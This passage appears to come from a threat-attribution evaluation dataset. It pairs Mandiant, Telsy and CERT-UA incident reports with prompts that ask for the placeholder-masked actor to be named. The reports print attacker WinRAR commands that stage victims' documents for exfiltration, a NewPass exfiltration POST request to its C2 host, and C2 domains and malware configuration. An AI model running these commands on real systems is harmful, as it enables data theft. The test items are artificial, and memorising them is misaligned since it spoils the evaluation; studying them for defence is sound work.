[PLACEHOLDER] injected process then downloaded and executed a WinRAR SFX containing KOPILUWAK to C:\Users\[username]\AppData\Local\Temp\0171ef74.exe (MD5: 2eb6df8795f513c324746646b594c019). Notably, this filename format has also been observed being utilized in Temp.Armageddon operations. Upon execution, the self-extracting archive created and executed KOPILUWAK from C:\Windows\Temp\xpexplore.js (MD5: d8233448a3400c5677708a8500e3b2a0).    In this case, UNC4210 used KOPILUWAK as a “first-stage” profiling utility as KOPILUWAK was the first custom malware used by this suspected [PLACEHOLDER] Team cluster following [PLACEHOLDER]. Through KOPILUWAK, UNC4210 conducted basic network reconnaissance on the victim machine with whoami, netstat, arp, and net, looking for all current TCP connections (with PID) and network shares. The attackers also checked the logical disks and list of current running processes on the machine. Each command result was piped into %TEMP%\result2.dat, before being uploaded to KOPILUWAK's C2 "manager.surro[.]am" via POST requests.    QUIETCANARY in the Mine  Two days after the initial execution of and reconnaissance performed with KOPILUWAK, on September 8, 2022, Mandiant detected UNC4210 download QUIETCANARY to a host twice, but only executing commands through it on the second time. QUIETCANARY is a lightweight .NET backdoor also publicly reported as “Tunnus” which UNC4120 used primarily to gather and exfiltrate data from the victim. Please see the QUIETCANARY analysis in the annex for technical details regarding the malware.    Following the extensive victim profiling by KOPILUWAK, the [PLACEHOLDER] injected process "wuauclt.exe" made a GET request to "yelprope.cloudns[.]cl" with the target URL "/system/update/cmu", which downloaded and executed QUIETCANARY. QUIETCANARY (MD5: 403876977dfb4ab2e2c15ad4b29423ff) was then written to disk.    UNC4210 then interacted with the QUIETCANARY backdoor, proceeding to utilize QUIETCANARY for compressing, staging, and exfiltrating data approximately 15 minutes later.    Data Theft  Mandiant observed interactive commands sent to and executed by QUIETCANARY. In one command observed, UNC4210 made a typo “netstat -ano -p tcppp” and had to reissue the command suggesting the following data theft was manual process rather than automated collection.    UNC4210 attempted to collect documents and data using WinRAR:      Data Collection Command Primary Command Operational Choices  rar a c:\\programdata\\win_rec.rar "%appdata%\\microsoft\\windows\\" -u -y -r -m2 -inul   Creation of “win_rec.rar” archive containing files recursively found in directories within “% AppData%\Microsoft\Windows\”, which would have expanded to “C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\” as QUIETCANARY was executed under the compromised user’s context.    rar a c:\\programdata\\win_rec.rar "c:\\users\\" -u -y -r -m2 -inul -n*.lnk       Creation of “win_rec.rar” archive containing files with .lnk extension (namely Windows LNK shortcuts), recursively found in directories within “C:\Users\”    rar a c:\\programdata\\win_files.rar "c:\\users\\" "d:\\" -u -y -r -m2 -inul -n*.pdf -n*.xls* -n*.txt -n*.doc* -hp[redacted] -v3M -ta20210101000000       Creation of “win_files.rar” password (redacted) encrypted archive split in 3MB parts, containing files with extensions .pdf, .xls(x), .txt and .doc(x), which were modified after 2021-01-01, recursively found in directories within “C:\Users\” and “D:\”    rar a c:\\programdata\\win_txt.rar "c:\\users" "d:\\" -u -y -r -m2 -inul -n*.txt -hp[redacted] -v3M       Creation of “win_txt.rar” password (redacted) encrypted archive split in 3MB parts, containing files with extension .txt, recursively found in directories within “C:\Users\” and “D:\”    Notably, UNC4210 appeared to only exfiltrate files created after 2021/01/01.    Conclusion  As older [PLACEHOLDER] malware continues to spread from compromised USB devices, these re-registered domains pose a risk as new threat actors can take control and deliver new malware to victims. This novel technique of claiming expired domains used by widely distributed, financially motivated malware can enable follow-on compromises at a wide array of entities. Further, older malware and infrastructure may be more likely to be overlooked by defenders triaging a wide variety of alerts.    This is Mandiant’s first observation of suspected [PLACEHOLDER] targeting Ukrainian entities since the onset of the invasion. The campaign’s operational tactics appear consistent with [PLACEHOLDER]’s considerations for planning and advantageous positioning to achieve initial access into victim systems, as the group has leveraged USBs and conducted extensive victim profiling in the past. In this case, the extensive profiling achieved since January possibly allowed the group to select specific victim systems and tailor their follow-on exploitation efforts to gather and exfiltrate information of strategic importance to inform Russian priorities. However, we note some elements of this campaign that appear to be a departure from historical [PLACEHOLDER] operations. Both KOPILUWAK and QUIETCANARY were downloaded in succession at various times, which may suggest the group was operating with haste or less concern for operational security, experiencing some aspect of operational deficiency, or using automated tools.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: USB Spreading  As Mandiant recently wrote about in our blog post, Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast Asia, USB spreading malware continues to be a useful vector to gain initial access into organizations. In this incident, a USB infected with several strains of older malware was inserted at a Ukrainian organization in December 2021. When the system's user double clicked a malicious link file (LNK) disguised as a folder within the USB drive, a legacy [PLACEHOLDER] sample was automatically installed and began to beacon out.    [PLACEHOLDER] or 2013 Wants Its Malware Back  The version of [PLACEHOLDER] that was installed to C:\Temp\TrustedInstaller.exe (MD5: bc76bd7b332aa8f6aedbb8e11b7ba9b6), was first uploaded on 2013-03-19 to VirusTotal and several of the C2 domains had either expired or been sinkholed by researchers. When executed, the [PLACEHOLDER] binary established persistence by dropping another [PLACEHOLDER] sample to C:\ProgramData\Local Settings\Temp\mskmde.com (MD5: b3657bcfe8240bc0985093a0f8682703) and adding a Run Registry Key to execute it every time the system user logged on. One of its C2 domains, “anam0rph[.]su,” which had expired, was found to be newly re-registered on 2022-08-12. UNC4210 used this C2 to profile victims before sending the first stage KOPILUWAK dropper if the victim was deemed interesting.    Mandiant identified several different hosts with beaconing [PLACEHOLDER] stager samples. However, we only observed one case in which [PLACEHOLDER]-related malware was dropped in additional stages, suggesting a high level of specificity in choosing which victims received a follow-on payload. During the time Mandiant monitored the C2s used to deliver the next stage payloads, the servers only remained up for a short period of a few days before going offline for several weeks at a time.    Recon with Ol’ Reliable KOPILUWAK  After several months of [PLACEHOLDER] beaconing without any significant activity observed, UNC4210 downloaded and executed a WinRAR Self-Extracting Archive (WinRAR SFX) containing KOPILUWAK (MD5: 2eb6df8795f513c324746646b594c019) to the victim host on September 6, 2022. Interestingly, the attackers appeared to download and run the same WinRAR SFX dropper containing KOPILUWAK seven times between September 6 and September 8. Each time the KOPILUWAK cast its net, it attempted to transfer significant amounts of data to the C2 manager.surro[.]am. It is unclear why UNC4210 did this as the profiling commands are hard coded in KOPILUWAK and would not yield different sets of data from the same host.    KOPILUWAK is a JavaScript-based reconnaissance utility used to facilitate C2 communications and victim profiling. It was first reported publicly by Kaspersky and has been tracked by Mandiant since 2017. Historically, the utility has been delivered to victims as a first-stage malicious email attachment. This is consistent with [PLACEHOLDER]’s historical reuse of tools and malware ecosystems, including KOPILUWAK, in cyber operations.    The [PLACEHOLDER] injected process “wuauclt.exe” made a GET request to “yelprope.cloudns[.]cl" with the target URL "/system/update/version.” yelprope.cloudns[.]cl is a ClouDNS dynamic DNS subdomain which was previously used by [PLACEHOLDER] and was re-registered by UNC4210. The [PLACEHOLDER] injected process then downloaded and executed a WinRAR SFX containing KOPILUWAK to C:\Users\[username]\AppData\Local\Temp\0171ef74.exe (MD5: 2eb6df8795f513c324746646b594c019). Notably, this filename format has also been observed being utilized in Temp.Armageddon operations. Upon execution, the self-extracting archive created and executed KOPILUWAK from C:\Windows\Temp\xpexplore.js (MD5: d8233448a3400c5677708a8500e3b2a0).    In this case, UNC4210 used KOPILUWAK as a “first-stage” profiling utility as KOPILUWAK was the first custom malware used by this suspected [PLACEHOLDER] Team cluster following [PLACEHOLDER]. Through KOPILUWAK, UNC4210 conducted basic network reconnaissance on the victim machine with whoami, netstat, arp, and net, looking for all current TCP connections (with PID) and network shares. The attackers also checked the logical disks and list of current running processes on the machine. Each command result was piped into %TEMP%\result2.dat, before being uploaded to KOPILUWAK's C2 "manager.surro[.]am" via POST requests.    QUIETCANARY in the Mine  Two days after the initial execution of and reconnaissance performed with KOPILUWAK, on September 8, 2022, Mandiant detected UNC4210 download QUIETCANARY to a host twice, but only executing commands through it on the second time. QUIETCANARY is a lightweight .NET backdoor also publicly reported as “Tunnus” which UNC4120 used primarily to gather and exfiltrate data from the victim. Please see the QUIETCANARY analysis in the annex for technical details regarding the malware.    Following the extensive victim profiling by KOPILUWAK, the [PLACEHOLDER] injected process "wuauclt.exe" made a GET request to "yelprope.cloudns[.]cl" with the target URL "/system/update/cmu", which downloaded and executed QUIETCANARY. QUIETCANARY (MD5: 403876977dfb4ab2e2c15ad4b29423ff) was then written to disk.    UNC4210 then interacted with the QUIETCANARY backdoor, proceeding to utilize QUIETCANARY for compressing, staging, and exfiltrating data approximately 15 minutes later.    Data Theft  Mandiant observed interactive commands sent to and executed by QUIETCANARY. In one command observed, UNC4210 made a typo “netstat -ano -p tcppp” and had to reissue the command suggesting the following data theft was manual process rather than automated collection.    UNC4210 attempted to collect documents and data using WinRAR:      Data Collection Command Primary Command Operational Choices  rar a c:\\programdata\\win_rec.rar "%appdata%\\microsoft\\windows\\" -u -y -r -m2 -inul   Creation of “win_rec.rar” archive containing files recursively found in directories within “% AppData%\Microsoft\Windows\”, which would have expanded to “C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\” as QUIETCANARY was executed under the compromised user’s context.    rar a c:\\programdata\\win_rec.rar "c:\\users\\" -u -y -r -m2 -inul -n*.lnk       Creation of “win_rec.rar” archive containing files with .lnk extension (namely Windows LNK shortcuts), recursively found in directories within “C:\Users\”    rar a c:\\programdata\\win_files.rar "c:\\users\\" "d:\\" -u -y -r -m2 -inul -n*.pdf -n*.xls* -n*.txt -n*.doc* -hp[redacted] -v3M -ta20210101000000       Creation of “win_files.rar” password (redacted) encrypted archive split in 3MB parts, containing files with extensions .pdf, .xls(x), .txt and .doc(x), which were modified after 2021-01-01, recursively found in directories within “C:\Users\” and “D:\”    rar a c:\\programdata\\win_txt.rar "c:\\users" "d:\\" -u -y -r -m2 -inul -n*.txt -hp[redacted] -v3M       Creation of “win_txt.rar” password (redacted) encrypted archive split in 3MB parts, containing files with extension .txt, recursively found in directories within “C:\Users\” and “D:\”    Notably, UNC4210 appeared to only exfiltrate files created after 2021/01/01.    Conclusion  As older [PLACEHOLDER] malware continues to spread from compromised USB devices, these re-registered domains pose a risk as new threat actors can take control and deliver new malware to victims. This novel technique of claiming expired domains used by widely distributed, financially motivated malware can enable follow-on compromises at a wide array of entities. Further, older malware and infrastructure may be more likely to be overlooked by defenders triaging a wide variety of alerts.    This is Mandiant’s first observation of suspected [PLACEHOLDER] targeting Ukrainian entities since the onset of the invasion. The campaign’s operational tactics appear consistent with [PLACEHOLDER]’s considerations for planning and advantageous positioning to achieve initial access into victim systems, as the group has leveraged USBs and conducted extensive victim profiling in the past. In this case, the extensive profiling achieved since January possibly allowed the group to select specific victim systems and tailor their follow-on exploitation efforts to gather and exfiltrate information of strategic importance to inform Russian priorities. However, we note some elements of this campaign that appear to be a departure from historical [PLACEHOLDER] operations. Both KOPILUWAK and QUIETCANARY were downloaded in succession at various times, which may suggest the group was operating with haste or less concern for operational security, experiencing some aspect of operational deficiency, or using automated tools.
https://www.telsy.com/en/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene/	Recently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked to the popular Russian Advanced Persistent Threat (APT) known as [PLACEHOLDER]. At the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally named “NewPass“ as one of the parameters used to send exfiltrated data to the command and control.  Telsy suspects this implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs.  NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other. There are at least three components of the malware: a dropper, that deploys the binary file; a loader library, that is able to decode the binary file extracting the last component, responsible for performing specific operations, such as communicate with the attackers’ command and control server (the “agent”)  The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries’ values.  Dropper Analysis  The first Windows library has a huge size, about 2.6 MB, and it is identified by the following hash:  Type    Value SHA256  e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078    Exploring the artifact using a static approach, it is possible to note that it exports a high number of functions, as shown in the following image.  Most of the reported functions point to useless code and only LocalDataVer can be used as an entry point of the DLL, therefore making it useful to understand the malicious behavior.  Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities, using “DllMain” or “DllRegisterServer” as an entrypoint function. In this case, both these functions cause the termination of the program, without showing the real malware behavior.  The library’s aim is to deploy the backdoor and its configuration file under two different folders depending on attacker’s customization.  According to what has been observed by our research team, the paths used in this case are the following:   Configuration Path      Backdoor Path ProgramData\Adobe\ARM\Reader_20.021.210_47.dat  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\lib3DXquery.dll ProgramData\WindowsHolographic\SpatialStore\HolographicSpatialStore.swid        WindowsHolographicService.dll    For the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters, but not the exact location in which the dropper deployed the implant artifact.  Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs, such as Adobe Reader or Windows Mixed Reality.  In particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and therefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost totally invisible.  The configuration file written, at first glance, seems to be totally encrypted and incomprehensible without analyzing the next stage. The following image shows the configuration file in its raw form.  Loader Analysis  The retrieved backdoor implants are identified by the following hashes:   Name    SHA256 lib3DXquery.dll 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0 WindowsHolographicService.dll   f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514    Once again, the libraries export several functions but only one is useful to execute their real payload.   To begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor terminates its execution. Vice versa, once found the file the malware starts to decode and read the current configuration.  The first 5 bytes of the file contains the size of the data to read starting from the 6th bytes and which contains the first encoded information useful to allow the malware to load the entire configuration.  All the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the function as represented in the following image.  So, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to read to obtain the initial configuration.  In this specific case, from the decoded bytes it gets the value 00081.  So, it proceeds to read other next 81 bytes.   Decoding these last ones with the usual key, it obtains a string composed by different parameters separated by “||”, as illustrated below.  However, this is still not the final configuration used by the malware, but it contains only the parameters to load the last malicious Windows library, named LastJournalx32.adf, containing the final agent.  This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection.   During its activity, the loader decrypts and maintains in memory the complete configuration used during the infection chain.  It consists of different JSON formatted structures that look like the following:   {    “RefreshToken”:””,    “NoInternetSleepTime”:”3600″,    “GetMaxSize”:”60000″,    “ClientId”:””,    “DropperExportFunctionName”:”LocalDataVer”,    “Autorun”:”16″,    “ImgurImageDeletionTime”:”120″,    “RecoveryServers”:[      ],    “RunDllPath”:”%WinDir%\\System32″,    “AgentLoaderExportFunctionName”:”LocalDataVer”,    “Key”:”[…redacted…]”,    “AgentName”:”LastJournalx32.adf”,    “UserAgent”:””,    […truncated…]    The structure contains all the information necessary for the loader to correctly launch the final agent. Some of these information are AgentFileSystemName, AgentExportName and AgentName.  The agent shares the same memory space of the loader, thus it is able to access to the same configuration and to extract the needed parameters, such as the object named Credentials. It also contains the domain name (newshealthsport[.]com) and the path (/sport/latest.php) of the command-and-control with which the agent will communicate.  From the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.  Moreover, the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the C2 as identifier of the infected machine.  The configuration also embeds a specific structure for persistence mechanisms that appears as follow:     {     “Autoruns”: {         “Service”: {             “DisplayName”: “Adobe Update Module”,             “ServiceName”: “Adobe Update Module”,             “Enabled”: “true”         },         “TaskScheduler”: {             “Enabled”: “false”         },         “Registry”: {             “Enabled”: “false”         },         “Policies”: {             “Enabled”: “false”         }     } }    The implant supports different types of persistence mechanisms: through Service Manager, Task Scheduler, via Registry Key or using Windows GPO.  In this specific case, attackers enabled the Service method that allows the malware to interact with the SCManager to create a new service named Adobe Update Module pointing to the path of the loader.     Agent Analysis The last payload is identified by the following hash:     Type    Value SHA256  08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f    It is responsible for exfiltrating information from the infected machine, sending it to the command-and-control and downloading new commands to be executed.  To make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within a POST request. The keywords are specified by attackers during development phase.  In the analyzed case, they are the following:  dbnew contentname newpass passdb data_src server_login table_data token_name server_page targetlogin So, during the exfiltration phase, the HTTP requests appear as reported in the table below     POST /sport/latest.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko Host: newshealthsport. com Content-Length: 170 Connection: Keep-Alive   newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&targetlogin=t&table_data=[redacted]      All the values embedded into the request are encrypted, probably using one of the keys embedded into the previous configuration. The algorithm used during the encryption phase is most probably a custom one.  Below, we report a simple scheme of the described infection chain, highlighting the three components of this new threat: the dropper, the loader and the agent.   Persistence As mentioned above, the malware is able to create services or tasks or to add registry keys to achieve persistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its path location as ImagePath.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Recently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked to the popular Russian Advanced Persistent Threat (APT) known as [PLACEHOLDER]. At the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally named “NewPass“ as one of the parameters used to send exfiltrated data to the command and control.  Telsy suspects this implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs.  NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other. There are at least three components of the malware: a dropper, that deploys the binary file; a loader library, that is able to decode the binary file extracting the last component, responsible for performing specific operations, such as communicate with the attackers’ command and control server (the “agent”)  The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries’ values.  Dropper Analysis  The first Windows library has a huge size, about 2.6 MB, and it is identified by the following hash:  Type    Value SHA256  e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078    Exploring the artifact using a static approach, it is possible to note that it exports a high number of functions, as shown in the following image.  Most of the reported functions point to useless code and only LocalDataVer can be used as an entry point of the DLL, therefore making it useful to understand the malicious behavior.  Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities, using “DllMain” or “DllRegisterServer” as an entrypoint function. In this case, both these functions cause the termination of the program, without showing the real malware behavior.  The library’s aim is to deploy the backdoor and its configuration file under two different folders depending on attacker’s customization.  According to what has been observed by our research team, the paths used in this case are the following:   Configuration Path      Backdoor Path ProgramData\Adobe\ARM\Reader_20.021.210_47.dat  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\lib3DXquery.dll ProgramData\WindowsHolographic\SpatialStore\HolographicSpatialStore.swid        WindowsHolographicService.dll    For the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters, but not the exact location in which the dropper deployed the implant artifact.  Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs, such as Adobe Reader or Windows Mixed Reality.  In particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and therefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost totally invisible.  The configuration file written, at first glance, seems to be totally encrypted and incomprehensible without analyzing the next stage. The following image shows the configuration file in its raw form.  Loader Analysis  The retrieved backdoor implants are identified by the following hashes:   Name    SHA256 lib3DXquery.dll 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0 WindowsHolographicService.dll   f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514    Once again, the libraries export several functions but only one is useful to execute their real payload.   To begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor terminates its execution. Vice versa, once found the file the malware starts to decode and read the current configuration.  The first 5 bytes of the file contains the size of the data to read starting from the 6th bytes and which contains the first encoded information useful to allow the malware to load the entire configuration.  All the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the function as represented in the following image.  So, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to read to obtain the initial configuration.  In this specific case, from the decoded bytes it gets the value 00081.  So, it proceeds to read other next 81 bytes.   Decoding these last ones with the usual key, it obtains a string composed by different parameters separated by “||”, as illustrated below.  However, this is still not the final configuration used by the malware, but it contains only the parameters to load the last malicious Windows library, named LastJournalx32.adf, containing the final agent.  This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection.   During its activity, the loader decrypts and maintains in memory the complete configuration used during the infection chain.  It consists of different JSON formatted structures that look like the following:   {    “RefreshToken”:””,    “NoInternetSleepTime”:”3600″,    “GetMaxSize”:”60000″,    “ClientId”:””,    “DropperExportFunctionName”:”LocalDataVer”,    “Autorun”:”16″,    “ImgurImageDeletionTime”:”120″,    “RecoveryServers”:[      ],    “RunDllPath”:”%WinDir%\\System32″,    “AgentLoaderExportFunctionName”:”LocalDataVer”,    “Key”:”[…redacted…]”,    “AgentName”:”LastJournalx32.adf”,    “UserAgent”:””,    […truncated…]    The structure contains all the information necessary for the loader to correctly launch the final agent. Some of these information are AgentFileSystemName, AgentExportName and AgentName.  The agent shares the same memory space of the loader, thus it is able to access to the same configuration and to extract the needed parameters, such as the object named Credentials. It also contains the domain name (newshealthsport[.]com) and the path (/sport/latest.php) of the command-and-control with which the agent will communicate.  From the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.  Moreover, the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the C2 as identifier of the infected machine.  The configuration also embeds a specific structure for persistence mechanisms that appears as follow:     {     “Autoruns”: {         “Service”: {             “DisplayName”: “Adobe Update Module”,             “ServiceName”: “Adobe Update Module”,             “Enabled”: “true”         },         “TaskScheduler”: {             “Enabled”: “false”         },         “Registry”: {             “Enabled”: “false”         },         “Policies”: {             “Enabled”: “false”         }     } }    The implant supports different types of persistence mechanisms: through Service Manager, Task Scheduler, via Registry Key or using Windows GPO.  In this specific case, attackers enabled the Service method that allows the malware to interact with the SCManager to create a new service named Adobe Update Module pointing to the path of the loader.     Agent Analysis The last payload is identified by the following hash:     Type    Value SHA256  08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f    It is responsible for exfiltrating information from the infected machine, sending it to the command-and-control and downloading new commands to be executed.  To make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within a POST request. The keywords are specified by attackers during development phase.  In the analyzed case, they are the following:  dbnew contentname newpass passdb data_src server_login table_data token_name server_page targetlogin So, during the exfiltration phase, the HTTP requests appear as reported in the table below     POST /sport/latest.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko Host: newshealthsport. com Content-Length: 170 Connection: Keep-Alive   newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&targetlogin=t&table_data=[redacted]      All the values embedded into the request are encrypted, probably using one of the keys embedded into the previous configuration. The algorithm used during the encryption phase is most probably a custom one.  Below, we report a simple scheme of the described infection chain, highlighting the three components of this new threat: the dropper, the loader and the agent.   Persistence As mentioned above, the malware is able to create services or tasks or to add registry keys to achieve persistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its path location as ImagePath.
https://cert.gov.ua/article/6276894	During December 15-25, 2023, several cases of distribution of e-mails with links to "documents" were discovered among government organizations, visiting which led to the damage of computers with malicious programs.    In the process of investigating the incidents, it was found that the mentioned links redirect the victim to a web resource, where, with the help of JavaScript and features of the application protocol "search" ("ms-search") [1], a shortcut file is downloaded, the opening of which leads to the launch A PowerShell command designed to download from a remote (SMB) resource and run (open) a decoy document, as well as the Python programming language interpreter and the Client.py file classified as MASEPIE.    Using MASEPIE, OPENSSH (for building a tunnel), STEELHOOK PowerShell scripts (stealing data from Chrome/Edge Internet browsers), and the OCEANMAP backdoor are loaded and launched on the computer. In addition, IMPACKET, SMBEXEC, etc. are created on the computer within an hour from the moment of the initial compromise, with the help of which network reconnaissance and attempts at further horizontal movement are carried out.    According to the combination of tactics, techniques, procedures and tools, the activity is associated with the activities of the [PLACEHOLDER] group. At the same time, it is obvious that the malicious plan also involves taking measures to develop a cyber attack on the entire information and communication system of the organization. Thus, the compromise of any computer can pose a threat to the entire network.    It should be noted that cases of similar attacks have also been recorded in relation to Polish organizations.    For reference:    OCEANMAP is a malicious program developed using the C# programming language. The main functionality consists in executing commands using cmd.exe. The IMAP protocol is used as a control channel. Commands, in base64-encoded form, are contained in message drafts ("Drafts") of the corresponding directories of electronic mailboxes; each of the drafts contains the computer name, user name and OS version. The results of executing commands are stored in the directory of incoming messages ("INBOX"). Implemented a mechanism for updating the configuration (command check interval, addresses, and authentication data of mail accounts), which involves patching the backdoor executable and restarting the process. Persistence is ensured by creating a .URL file 'VMSearch.url' in the autorun directory.  MASEPIE is a malicious program developed using the Python programming language. The main functionality consists in uploading/unloading files and executing commands. The TCP protocol is used as a control channel. Data is encrypted using the AES-128-CBC algorithm; the key, which is a sequence of 16 arbitrary bytes, is generated at the beginning of the connection establishment. Backdoor persistence is ensured by creating the 'SysUpdate' key in the 'Run' branch of the OS registry, as well as by using the LNK file 'SystemUpdate.lnk' in the startup directory.  STEELHOOK is a PowerShell script that provides the theft of Internet browser data ("Login Data", "Local State") and the DPAPI master key by sending them to the management server using an HTTP POST request in base64-encoded form.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: During December 15-25, 2023, several cases of distribution of e-mails with links to "documents" were discovered among government organizations, visiting which led to the damage of computers with malicious programs.    In the process of investigating the incidents, it was found that the mentioned links redirect the victim to a web resource, where, with the help of JavaScript and features of the application protocol "search" ("ms-search") [1], a shortcut file is downloaded, the opening of which leads to the launch A PowerShell command designed to download from a remote (SMB) resource and run (open) a decoy document, as well as the Python programming language interpreter and the Client.py file classified as MASEPIE.    Using MASEPIE, OPENSSH (for building a tunnel), STEELHOOK PowerShell scripts (stealing data from Chrome/Edge Internet browsers), and the OCEANMAP backdoor are loaded and launched on the computer. In addition, IMPACKET, SMBEXEC, etc. are created on the computer within an hour from the moment of the initial compromise, with the help of which network reconnaissance and attempts at further horizontal movement are carried out.    According to the combination of tactics, techniques, procedures and tools, the activity is associated with the activities of the [PLACEHOLDER] group. At the same time, it is obvious that the malicious plan also involves taking measures to develop a cyber attack on the entire information and communication system of the organization. Thus, the compromise of any computer can pose a threat to the entire network.    It should be noted that cases of similar attacks have also been recorded in relation to Polish organizations.    For reference:    OCEANMAP is a malicious program developed using the C# programming language. The main functionality consists in executing commands using cmd.exe. The IMAP protocol is used as a control channel. Commands, in base64-encoded form, are contained in message drafts ("Drafts") of the corresponding directories of electronic mailboxes; each of the drafts contains the computer name, user name and OS version. The results of executing commands are stored in the directory of incoming messages ("INBOX"). Implemented a mechanism for updating the configuration (command check interval, addresses, and authentication data of mail accounts), which involves patching the backdoor executable and restarting the process. Persistence is ensured by creating a .URL file 'VMSearch.url' in the autorun directory.  MASEPIE is a malicious program developed using the Python programming language. The main functionality consists in uploading/unloading files and executing commands. The TCP protocol is used as a control channel. Data is encrypted using the AES-128-CBC algorithm; the key, which is a sequence of 16 arbitrary bytes, is generated at the beginning of the connection establishment. Backdoor persistence is ensured by creating the 'SysUpdate' key in the 'Run' branch of the OS registry, as well as by using the LNK file 'SystemUpdate.lnk' in the startup directory.  STEELHOOK is a PowerShell script that provides the theft of Internet browser data ("Login Data", "Local State") and the DPAPI master key by sending them to the management server using an HTTP POST request in base64-encoded form.
https://cert.gov.ua/article/4492467	During April 2023, the government computer emergency response team of Ukraine CERT-UA recorded cases of the distribution of e-mails with the subject "Windows Update" among government bodies of Ukraine, sent, apparently, on behalf of system administrators of departments. At the same time, e-mail addresses of senders created on the public service "@outlook.com" can be formed using the employee's real surname and initials.    The sample letter contains "instructions" in Ukrainian for "updates to protect against hacker attacks", as well as graphical images of the process of launching a command line and executing a PowerShell command.    The mentioned command will download a PowerShell script that, simulating the process of updating the operating system, will download and execute the following PowerShell script designed to collect basic information about the computer using the "tasklist", "systeminfo" commands, and send the received results using HTTP request to the Mocky service API.    We recommend restricting the ability of users to run PowerShell and monitor network connections to the Mocky service API.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: During April 2023, the government computer emergency response team of Ukraine CERT-UA recorded cases of the distribution of e-mails with the subject "Windows Update" among government bodies of Ukraine, sent, apparently, on behalf of system administrators of 